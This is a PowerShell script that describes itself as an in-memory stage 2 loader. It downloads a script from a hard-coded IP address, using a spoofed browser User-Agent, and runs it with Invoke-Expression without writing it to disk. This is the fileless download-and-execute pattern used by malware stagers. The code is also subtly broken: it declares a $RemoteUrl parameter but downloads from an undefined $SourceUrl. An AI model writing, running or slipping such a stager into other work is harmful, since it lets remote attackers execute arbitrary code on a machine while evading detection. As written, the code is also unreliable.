<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://203.0.113.95/stage2.ps1',
    [int]$TimeoutSec = 146
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$DownloadedScript = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($DownloadedScript)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $DownloadedScript.Length)
Invoke-Expression $DownloadedScript

Write-Verbose "stage marker 37 reached"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
